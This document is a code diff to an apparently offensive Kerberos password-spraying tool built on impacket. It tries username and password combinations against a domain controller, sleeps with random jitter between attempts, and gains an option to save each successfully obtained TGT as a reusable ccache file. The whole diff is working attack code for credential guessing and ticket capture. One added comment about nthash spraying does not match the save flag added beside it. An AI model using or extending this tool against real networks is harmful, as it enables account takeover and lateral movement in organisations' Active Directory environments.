@@ -1,4 +1,4 @@
-from argparse import ArgumentParser, Namespace
+from argparse import ArgumentParser, BooleanOptionalAction, Namespace
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 from typing import Any, Generator
@@ -7,7 +7,9 @@ import json
 import random
 import time
 
+from impacket.krb5.ccache import CCache
 from impacket.krb5.constants import PrincipalNameType
+from impacket.krb5.crypto import Key
 from impacket.krb5.kerberosv5 import KerberosError
 from impacket.krb5.kerberosv5 import getKerberosTGT
 from impacket.krb5.types import Principal
@@ -34,6 +36,8 @@ def main() -> None:
     group.add_argument('-P', '--passwords', action='append', type=Path, default=[], metavar='FILE')
     group.add_argument('-c', '--credential', action='append', default=[], metavar='USER:PASS')
     group.add_argument('-C', '--credentials', action='append', type=Path, default=[], metavar='FILE')
+    # add support for spraying nthash/rc4
+    group.add_argument('-s', '--save', action=BooleanOptionalAction, default=False)
     opts = entrypoint.parse_args()
     if not (((opts.user or opts.users) and (opts.password or opts.passwords)) or opts.credential or opts.credentials):
         print('error: users, passwords or credentials missing')
@@ -74,13 +78,25 @@ def authenticate(opts: Namespace, credential: tuple[str, str]) -> dict[str, Any]
     username, password = credential
 
     principal = Principal(username, type=PrincipalNameType.NT_PRINCIPAL.value)  # type: ignore
+    ticket_path = None
     try:
-        getKerberosTGT(clientName=principal, password=password, lmhash='', nthash='', aesKey='', domain=opts.domain, kdcHost=opts.kdc)
+        ticket, _cipher, old_session_key, session_key = getKerberosTGT(clientName=principal, password=password, lmhash='', nthash='', aesKey='', domain=opts.domain, kdcHost=opts.kdc)
         error = 'KDC_ERR_NONE'
+        if opts.save:
+            ticket_path = save_ticket(opts.domain, username, ticket, old_session_key, session_key)
     except KerberosError as e:
         error = next(iter(e.getErrorString()))
     time.sleep(random.randint(opts.delay - opts.jitter, opts.delay + opts.jitter))
-    return dict(username=username, password=password, error=error)
+    return dict(username=username, password=password, ticket=ticket_path, error=error)
+
+
+def save_ticket(domain: str, username: str, ticket: bytes, old_session_key: Key, session_key: Key) -> str:
+    ccache = CCache()
+    ccache.fromTGT(ticket, old_session_key, session_key)
+    path = f'krbspray-{username}@{domain}.ccache'
+    assert '..' not in path
+    ccache.saveFile(path)
+    return path
 
 
 if __name__ == '__main__':
